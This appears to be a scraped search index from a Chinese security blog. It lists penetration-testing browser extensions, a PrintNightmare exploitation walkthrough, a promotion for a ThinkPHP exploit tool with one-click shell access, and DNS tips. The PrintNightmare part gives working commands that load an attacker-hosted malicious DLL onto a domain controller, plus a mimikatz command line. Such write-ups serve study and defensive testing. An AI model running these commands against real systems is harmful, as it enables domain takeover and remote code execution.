https://chrome.google.com/webstore/detail/ip-address-and-domain-inf/lhgkegeccnckoiliokondpaaalbhafoa x情报查询助手 X情报社区出品的情报查询插件，帮助您在高强度的情报查询中发现可疑信息。 下载地址： x情报查询助手 红雨滴情报助手 红雨滴情报助手（RedDrip Intelligence Assistant）是奇安信威胁情报中心（QI-ANXIN Threat Intelligence Center）开发，方便用户查询威胁情报、快速识别判定威胁风险的谷歌浏览器插件服务。 下载地址： 红雨滴情报助手 anti-honeypot 用来检测 WEB 蜜罐并中断请求，能够识别并中断长亭 D-sensor 和墨安幻阵的部分溯源 API。 项目地址：https://github.com/Ar3h/anti-honeypot 隐私獾 隐私獾保护您在浏览网页时免受跟踪。大部分网站都植入第三方跟踪器，在未经允许情况下跟踪您访问过哪些页面，又停留多久。如果您安装隐私獾，许多跟踪器将被阻止。尽管隐私獾能够减少大量跟踪Cookie并且屏蔽其它跟踪器，但这并非万灵药。您可以将隐私獾配合其它浏览器附加元件使用，比如：uBlock Origin、CanvasBlocker、HTTPS Everywhere、ClearURLs与Decentraleyes。 下载地址： 隐私獾 改包发包 HackBar 这个插件可用于常见编码 / 解码、POST/Cookies 数据提交、SQL/XSS/LFI/XXE 漏洞测试、自定义 Referer/User-Agent 等，是一款不可多得的渗透测试人员必备插件，虽然现在作者已经收费了，但还是能够绕过其限制的。 下载地址： https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc DenisPodgurskii/pentestkit 下载地址： https://github.com/DenisPodgurskii/pentestkit Penetration Testing Kit 下载地址： https://chrome.google.com/webstore/detail/penetration-testing-kit/ojkchikaholjmcnefhjlbohackpeeknd HTTP Header Live 这个插件可用于捕获网页中加载的全部网页流量数据包，并且支持编辑和重发，就是 UI 差了点，大部分的同类插件都只能查看，不能编辑和重放。 辅助工具 Hack-Tools payload快速生成，编码解码 下载地址： d3coder - Chrome 网上应用店 (google.com) d3coder 这个插件可用于各种类型的编码和解码，例如 URI、Hex、Base64，Rot13 或 Unix 时间戳等编码之间的相互转换。 下载地址： d3coder - Chrome 网上应用店 (google.com) Set Character Encoding 这个插件可用来修改当前浏览器的编码，当浏览器编码与网页编码不一致时就会出现乱码的情况，最后吐槽一下这个新版谷歌浏览器的编码设置是真不好找。 Set Character Encoding - Chrome 网上应用店 (google.com) Charset - Chrome 网上应用店 (google.com) EditThisCookie 这个插件可以帮助我们轻松管理谷歌浏览器上的各种 Cookies，支持添加，删除，编辑，搜索，锁定、屏蔽、保护和拦截 Cookies！ 下载地址： EditThisCookie - Chrome 网上应用店 (google.com) Cookie-Editor - Chrome 网上应用店 (google.com) X-Forwarded-For Header 请求ip伪造 下载地址： X-Forwarded-For Header - Chrome 网上应用店 (google.com) Proxy SwitchyOmega 这个插件可以帮助我们快速管理和切换多个代理设置，支持的代理协议有：HTTP/HTTPS、Socks4/Socks5，这也是一款渗透测试人员（抓包、上 “墙”）必备插件，谷歌上网助手插件也具备这样的代理设置功能。 下载地址： Proxy SwitchyOmega - Chrome 网上应用店 (google.com) User-Agent Switcher 这个插件可用来模拟指定 User-Agent 去访问网站，有的开发人员在编写代码过程中会设置仅允许移动端 User-Agent 访问，一些做黑帽 SEO 的也经常使用这种方式来限制 PC 端访问。这款插件在 Chrome 网上应用商店中已经下架了，有需要的可以找我。 下载地址： User-Agent Switcher for Chrome - Chrome 网上应用店 (google.com) NoScript 这个插件可用于禁止浏览器加载和解析 JS 代码，也可以通过以下两种方式禁止执行 JS，常见应用场景有：禁用 JS 后台越权、禁用 JS 白名单上传等。 Firefox：about:config-&gt;javascript.enabled Chorme：chrome://settings/content/javascript 下载地址: NoScript - Chrome 网上应用店 (google.com) JWT Debugger JWT Debugger 是一款可以编码、验证和生成JWT的开发工具，官方提供了调试工具,我们可以很方便的看到JWT token各个组成部分解码后的信息,以及是否能验证成功。 下载地址: JWT Debugger - Chrome 网上应用店 (google.com) 漏洞利用 Elasticvue Elasticsearch 服务未授权访问漏洞进行利用 下载地址： Elasticvue - Chrome 网上应用店 (google.com) ","link":"https://bewhale.github.io/post/浏览器插件分享/"},{"title":"PrintNightmare(CVE-2021-1675/CVE-2021-34527)复现","content":"漏洞描述 此漏洞一开始为CVE-2021-1675，随后微软把此漏洞分配给了CVE-2021-34527,并提到了两个漏洞很像，但是攻击向量是不同的。 详见: CVE-2021-34527 - 安全更新程序指南 - Microsoft - Windows 打印后台处理程序远程执行代码漏洞 cve-2021-1675的更新补丁只是修复了本地提权利用，远程代码执行还是可以利用。 Github 公布的地址：https://github.com/afwu/PrintNightmare 影响版本 Windows 7 Windows 8.1 Windows 10 Windows Server 2008 R2 Windows Server 2012 Windows Server 2016 Windows Server 2019 漏洞准备 环境准备 一个普通权限的域账户 目标开启Spooler服务 创建的smb服务允许匿名访问，即目标可以直接获取到文件 首先创建一个可以允许匿名访问的 smb, 在域控上必须能直接获取到文件 windows系统创建方法： 三好学生大佬的脚本: 3gstudent/Invoke-BuildAnonymousSMBServer: Use to build an anonymous SMB file server. cube0x0作者给的脚本, 复制下面信息到一个PS1文件中，管理员权限运行该powershell脚本： // powershell版本过低的话会报错 mkdir C:\\share icacls C:\\share\\ /T /grant Anonymous` logon:r icacls C:\\share\\ /T /grant Everyone:r New-SmbShare -Path C:\\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone' REG ADD &quot;HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters&quot; /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes REG ADD &quot;HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters&quot; /v NullSessionShares /t REG_MULTI_SZ /d share /f REG ADD &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f REG ADD &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v RestrictAnonymous /t REG_DWORD /d 0 /f # Reboot kali配置smb共享 参考：复现CVE-2021-1675 - Rainbovv - 博客园 [global] workgroup = WORKGROUP server string = Samba Server netbios name = MYSERVER log file = /var/log/samba/log.%m max log size = 50 security = user map to guest = Bad User [smb] comment = Template Directories browseable = yes writeable = yes path = /tmp/ guest ok = yes 配置完毕以后，需要执行命令开启samba服务即可 service smbd start 常见报错 pDriverPath无法枚举问题 虽然最新版exp可以自动枚举驱动目录，但我安装的WinServer2019版本会报错枚举失败，如果失败的话就只能手动置顶py脚本中的pDriverPath变量值，并把上一句注释掉。 #blob = getDrivers(dce, handle)``pDriverPath = ‘自定义路径+\\\\UNIDRV.DLL' dll加载问题 1.exp执行完毕没有报错，但是就是不上线 // 需要检查dll是否是64位，建议重新生成64位dll测试，dll并未执行，验证用户不是普通域用户账号。 2.exp执行过程报错“DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied”。 // 检查smb共享是否可以匿名访问。 3.exp执行过程报错“DCERPCSessionError: RPRN SessionError: code: 0x3 - ERROR_PATH_NOT_FOUND - The system cannot find the path specified.” // 检查dll加载地址，kali下用单引号, windows 用双引号 漏洞利用 利用工具 python版本的 https://github.com/cube0x0/CVE-2021-1675 C#版： https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare C++版本的 https://github.com/afwu/PrintNightmare 本地提权版： https://github.com/hlldz/CVE-2021-1675-LPE mimikatz: 2.2.0 20210709 Printnightmare rewrited 漏洞过程 首先搭建一个SMB匿名共享，放恶意dll文件。 工具运行后会先检测C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_xx 文件名，自动替换。 然后远程拉取我们设置的匿名共享的恶意dll文件执行 python版本 其中python版本的exp需要按照说明文档安装exp作者的impacket库，其余不需要修改任何东西。 pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install 可以使用rpcdump.py来扫描潜在的易受攻击的主机，如果它返回一个值，它可能是易受攻击的 协议：[MS-RPRN]：打印系统远程协议 kali python3 rpcdump.py @192.168.0.1 | grep MS-RPRN win python3 rpcdump.py @192.168.0.1 | findstr MS-RPRN 然后进行利用，这里使用 dll 是 cs 生成的 dll win python3 CVE-2021-1675.py djhons.com/test:Admin@123@192.168.0.1 &quot;\\\\192.168.0.2\\smb\\shell.dll&quot; kali python3 CVE-2021-1675.py djhons.com/test:Admin@123@192.168.0.1 '\\\\192.168.0.2\\smb\\shell.dll' mimikatz mimikatz.exe misc::printnightmare /server:192.168.0.1 /authuser:localuser /authpassword:pass /library:\\\\192.168.0.2\\smb\\shell.dll /nodynamic c++版本 没测试，需要改源码，参考一下。 推荐使用其他工具，可以自动枚举路径。 //info.pDriverPath = (LPWSTR)L&quot;C:\\\\Windows\\\\System32\\\\DriverStore\\\\FileRepository\\\\ntprint.inf_amd64_[受害机特有的]\\\\Amd64\\\\UNIDRV.DLL&quot;; info.pDriverPath = (LPWSTR)L&quot;C:\\\\Windows\\\\System32\\\\DriverStore\\\\FileRepository\\\\ntprint.inf_amd64_83aa9aebf5dffc96\\\\Amd64\\\\UNIDRV.DLL&quot;; 剩下是将含有old的路径改为 C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\x64\\\\%s。 参考文章 https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20211675lou-dong-fu-xian.html 复现CVE-2021-1675 https://mp.weixin.qq.com/s/Vceup70C9USoM4JwK-6Z9w https://mp.weixin.qq.com/s/iNOb6cBAfMwCm2AjqbdEvQ CVE-2021-1675 打印机漏洞沦陷域控的补充 07/02/21 ","link":"https://bewhale.github.io/post/PrintNightmare复现/"},{"title":"ThinkPHP图形化综合利用工具","content":"下载地址： ThinkPHP 综合利用工具 V2.0 by 蓝鲸.jar 本项目是采用 JDK8 + javafx 开发的 ThinkPHP 图形化综合利用工具， 参考了其他大佬项目的部分代码。 JDK8可以直接运行，JDK11 因为去除了javafx这个依赖，需要自己再加上参数加入模块 java -Dfile.encoding=&quot;UTF-8&quot; --module-path &quot;C:\\Program Files\\Java\\javafx-sdk-11.0.2\\lib&quot; --add-modules &quot;javafx.controls,javafx.fxml,javafx.web&quot; -jar &quot;xxx.jar&quot; 支持大部分ThinkPHP漏洞检测,整合20多个payload 支持部分漏洞执行命令 支持单一漏洞批量检测 支持TP3和TP5自定义路径日志遍历 支持部分漏洞一键GetShell 支持设置代理和UA 参考项目 https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection https://github.com/Lucifer1993/TPscan https://github.com/fupinglee/JavaTools https://github.com/xinyu2428/TDOA_RCE ","link":"https://bewhale.github.io/post/thinkphp综合利用工具/"},{"title":"Github部分网站无法访问解决办法","content":"国内大部分地方无法访问以下域名 *.github.io raw.githubusercontent.com 原因大都是是国内运营商DNS污染, ping一些域名可以发现, 域名往往被指向了 127.0.0.1, 或者直接提示找不到主机 最直接的方法就是挂代理 修改本地hosts文件的话，遇到一个新的域名，又要添加一条新纪录，稍显麻烦， 所有我们直接修改本机的DNS地址，一劳永逸。 修改完DNS地址后，点击高级查看是否还有其他的DNS地址，删除掉。 然后打开cmd， 执行 ipconfig /flushdns 清除缓存 如下图： 一些常用的DNS地址： 114DNS 首选：114.114.114.114 备选：114.114.114.115 Google DNS 8.8.8.8 8.8.4.4 阿里 AliDNS 首选：233.5.5.5 备选：223.6.6.6 或者使用图形化工具来一键测试，修改，不要忘记在高级里面把多余的DNS地址删除掉。 dns-jumper-v2-2/ ","link":"https://bewhale.github.io/post/github部分网站无法访问解决办法/"}]}